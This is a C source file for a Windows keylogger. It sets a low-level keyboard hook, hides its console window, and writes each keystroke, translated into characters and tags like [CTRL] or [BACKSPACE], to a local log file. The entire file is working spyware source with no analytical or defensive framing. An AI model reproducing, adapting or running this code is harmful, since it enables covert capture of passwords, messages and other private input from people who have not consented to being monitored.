#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

void config();
void startListen();
LRESULT CALLBACK callBack(int nCode, WPARAM wParam, LPARAM lParam);
char *getChar(int code);

FILE *log_file;
HHOOK keylogger;
KBDLLHOOKSTRUCT kbd;

int main(int argc, char const *argv[]) {
	config();
	startListen();
	return 0;
}

void config() {
	log_file = fopen("keylogger_log.log", "a");
	if (log_file == NULL) {
		perror("Error: Unable to create log file.\n");
		exit(1);
	}
}

void startListen() {
	if((keylogger = SetWindowsHookExA(WH_KEYBOARD_LL, callBack, NULL, 0)) == NULL) {
		perror("Set Hook Failed");
		exit(0);
	}

	FreeConsole();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {}
}

LRESULT CALLBACK callBack(int nCode, WPARAM wParam, LPARAM lParam) {
	if(nCode < 0) {
		return CallNextHookEx(keylogger, nCode, wParam, lParam);
	}

	kbd = *((KBDLLHOOKSTRUCT *) lParam);

	if(wParam == WM_KEYDOWN) {
		fprintf(log_file, "%s", getChar(kbd.vkCode));
    	fflush(log_file);
    	fflush(stdout);
	}

	return CallNextHookEx(keylogger, nCode, wParam, lParam);
}

char *getChar(int code) {
	char key;
	char str[2];
	if (code == 1 || code == 2) { return "\0"; }
	switch(code) {
		case 1: return "[LEFTCLICK]";
		case 2: return "[RIGHTCLICK]";
		case VK_ESCAPE: return "[ESC]";
		case VK_F1: return "[F1]";
		case VK_F2: return "[F2]";
		case VK_F3: return "[F3]";
		case VK_F4: return "[F4]";
		case VK_F5: return "[F5]";
		case VK_F6: return "[F6]";
		case VK_F7: return "[F7]";
		case VK_F8: return "[F8]";
		case VK_F9: return "[F9]";
		case VK_F10: return "[F10]";
		case VK_F11: return "[F11]";
		case VK_F12: return "[F12]";
		case VK_SNAPSHOT: return "[SNAPSHOT]";
		case VK_PAUSE: return "[PAUSE]";
		case VK_DELETE: return "[DELETE]";
		case VK_HOME: return "[HOME]";
		case VK_PRIOR: return "[PAGEUP]";
		case VK_NEXT: return "[PAGEDOWN]";
		case VK_END: return "[END]";
		case VK_NUMLOCK: return "[NUMLOCK]";
		case VK_BACK: return "[BACKSPACE]";
		case VK_INSERT: return "[INSERT]";
		case VK_LEFT: return "[LEFTARROW]";
		case VK_UP: return "[UPARROW]";
		case VK_RIGHT: return "[RIGHTARROW]";
		case VK_DOWN: return "[DOWNARROW]";
		case VK_SPACE: return " ";
		case VK_TAB: return "	";
		case VK_CAPITAL: return "[CAPSLOCK]";
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
			return "[SHIFT]";
		case VK_MENU: return "[ALT]";
		case VK_CONTROL:
		case VK_LCONTROL:
		case VK_RCONTROL:
			return "[CTRL]";
		case VK_RETURN: return "\n";
		default:
			key = MapVirtualKeyExA(code, MAPVK_VK_TO_CHAR, GetKeyboardLayout(0));
			str[0] = tolower(key);
			str[1] = '\0';
			return strdup(str);
	}
}